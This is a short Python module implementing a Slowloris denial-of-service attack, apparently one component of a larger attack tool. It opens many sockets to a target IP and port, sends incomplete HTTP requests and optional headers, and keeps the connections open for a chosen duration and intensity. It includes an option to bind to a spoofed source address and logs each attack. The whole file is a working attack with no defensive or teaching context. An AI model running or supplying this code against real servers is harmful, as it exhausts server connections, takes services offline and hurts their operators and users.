import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
    start_time = time.time()
    sockets = []

    while time.time() - start_time < duration:
        for _ in range(intensity):
            try:
                # Create a new socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if spoof_ip:
                    sock.bind((spoof_ip, 0))
                sock.connect((target_ip, target_port))
                # Send partial HTTP request
                sock.send(b"GET / HTTP/1.1\r\n")
                if headers:
                    for key, value in headers.items():
                        sock.send(f"{key}: {value}\r\n".encode())
                # Keep the connection open
                sockets.append(sock)
            except Exception as e:
                print(f"Error creating socket: {e}")

        # Sleep to keep connections open
        time.sleep(10)

    # Close all sockets
    for sock in sockets:
        try:
            sock.close()
        except Exception as e:
            print(f"Error closing socket: {e}")

    # Log the attack
    log_attack("Slowloris", target_ip, target_port, duration, intensity)